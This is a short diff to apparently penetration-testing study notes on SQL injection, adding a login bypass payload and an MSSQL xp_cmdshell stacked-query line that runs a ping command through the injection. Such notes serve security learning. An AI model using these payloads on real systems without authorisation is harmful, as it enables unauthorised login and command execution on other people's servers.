@@ -53,7 +53,9 @@ Useful nmap scripts:
 
 For SQL injection focused task either perform the injection manually or use sqlmap tool. Check fields using single quote or encoded single quote.
 
-```blah' or 1=1 --``` - Basic login bypass payload.
+```blah' or 1=1 --``` - Basic login bypass payload. Adjust for specific case.
+
+```blah';exec master..xp_cmdshell 'ping [URL] -l 65000 -t'; --``` - Example command to pop shell through sql injection.
 
 <details>
 <summary>sqlmap</summary>
